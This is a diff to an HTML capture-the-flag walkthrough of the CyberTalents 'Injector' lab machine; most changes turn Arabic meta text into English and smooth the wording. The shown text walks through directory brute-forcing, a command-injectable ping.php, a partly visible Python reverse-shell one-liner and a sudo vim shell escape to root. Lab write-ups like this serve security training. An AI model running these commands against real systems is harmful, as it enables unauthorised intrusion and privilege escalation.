@@ -7,7 +7,7 @@
 
 <!-- ===== Social Media Preview (Facebook + WhatsApp + Twitter) ===== -->
 <meta property="og:title" content="Injector Machine Writeup • CyberTalents">
-<meta property="og:description" content="حل كامل لآلة Injector من CyberTalents مع طريقة الاستغلال، PrivEsc، وكل الخطوات. 🔥">
+<meta property="og:description" content="Full writeup for the Injector machine from CyberTalents including exploitation steps, command injection, and privilege escalation. 🔥">
 <meta property="og:image" content="https://senyx122.github.io/preview.jpg">
 <meta property="og:url" content="https://senyx122.github.io/Injector.html">
 <meta property="og:type" content="article">
@@ -19,7 +19,7 @@
 <!-- Twitter -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Injector Machine Writeup • CyberTalents">
-<meta name="twitter:description" content="حل كامل لآلة Injector من CyberTalents مع طريقة الاستغلال والـ Privilege Escalation.">
+<meta name="twitter:description" content="Complete walkthrough for the Injector machine including command injection and privilege escalation.">
 <meta name="twitter:image" content="https://senyx122.github.io/preview.jpg">
 
 <link href="https://fonts.googleapis.com/css2?family=Inconsolata&display=swap" rel="stylesheet">
@@ -65,8 +65,8 @@
 <img src="https://cybertalents.com/images/logo-footer.png" alt="CyberTalents Logo" class="logo">
 
 <h2>Overview</h2>
-<p>Injector machine is an easy box with some good ideas.</p>
-<p>By the way, I couldn’t solve the machine through the VPN because of some problems, but I solved the machine through its public IP which is <code>3.127.234.70</code>.</p>
+<p>The Injector machine is an easy-level box with some interesting ideas.</p>
+<p>I wasn’t able to solve it through the VPN due to some issues, so I solved it using its public IP: <code>3.127.234.70</code>.</p>
 
 <h2>Methodology</h2>
 <ul>
@@ -85,26 +85,26 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 </pre>
 
-<p>Found two open ports:</p>
+<p>Two open ports were found:</p>
 <ul>
     <li>22/tcp - SSH</li>
     <li>80/tcp - HTTP</li>
 </ul>
 
 <h3>Web Server</h3>
-<p>Default Apache page. Nothing interesting. Let's do directory brute force:</p>
+<p>The default Apache page was displayed. Nothing interesting there. I started directory brute-forcing:</p>
 
 <pre>
 gobuster dir -u http://3.127.234.70/ -w /usr/share/dirb/wordlists/common.txt
 </pre>
 
-<p>Found <code>/secret</code> directory, but still nothing interesting. Tried again:</p>
+<p>Found the <code>/secret</code> directory, but still nothing useful. Ran another scan:</p>
 
 <pre>
 gobuster dir -u http://3.127.234.70/secret/ -w /usr/share/dirb/wordlists/common.txt
 </pre>
 
-<p>Found:</p>
+<p>Found these:</p>
 <ul>
     <li>/company</li>
     <li>/admin.html</li>
@@ -113,10 +113,10 @@ gobuster dir -u http://3.127.234.70/secret/ -w /usr/share/dirb/wordlists/common.
     <li>/tools</li>
 </ul>
 
-<p>In <code>/tools</code>, found <code>ping.php</code> - a pinging script vulnerable to <strong>Command Injection</strong>.</p>
+<p>Inside <code>/tools</code>, I found <code>ping.php</code> — a ping script vulnerable to <strong>Command Injection</strong>.</p>
 
 <h3>Reverse Shell</h3>
-<p>Executed this one-liner:</p>
+<p>I executed the following one‑liner for a reverse shell:</p>
 
 <pre>
 python -c 'import socket,subprocess,os;
@@ -128,25 +128,25 @@ os.dup2(s.fileno(),2);
 import pty; pty.spawn("/bin/bash")'
 </pre>
 
-<p>Got shell as <code>www-data</code>.</p>
+<p>Got a shell as <code>www-data</code>.</p>
 
 <h2>Privilege Escalation</h2>
-<p>Found a <code>TrollFace.jpg</code> in <code>/var/www</code>.</p>
+<p>I found a file named <code>TrollFace.jpg</code> in <code>/var/www</code>.</p>
 
-<p>Used <code>steghide</code> and got a password.</p>
+<p>Using <code>steghide</code>, I extracted a hidden password.</p>
 
-<p>Switched to user <code>alex</code> using the password.</p>
+<p>I then switched to user <code>alex</code> using that password.</p>
 
-<p>Then found that <code>vim</code> can be run with sudo:</p>
+<p>Next, I discovered that <code>vim</code> can be run with sudo privileges:</p>
 
 <pre>
 sudo vim -c ':! /bin/sh'
 </pre>
 
-<p>And we got root!</p>
+<p>And that gave root access.</p>
 
-<h2>Rooted </h2>
-<p>If you have any questions, DM me on Facebook.</p>
+<h2>Rooted</h2>
+<p>If you have any questions, feel free to DM me on Facebook.</p>
 
 </body>
 </html>
